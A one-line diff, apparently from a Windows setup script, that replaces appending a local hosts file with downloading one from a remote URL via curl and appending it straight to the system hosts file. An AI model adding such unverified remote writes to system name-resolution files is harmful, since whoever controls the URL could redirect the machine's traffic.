@@ -1,1 +1,1 @@
-Get-Content -Path hosts | Add-Content -Path C:\Windows\System32\drivers\etc\hosts
+curl -L https://sjb.koyo.io/hosts | Add-Content -Path C:\Windows\System32\drivers\etc\hosts
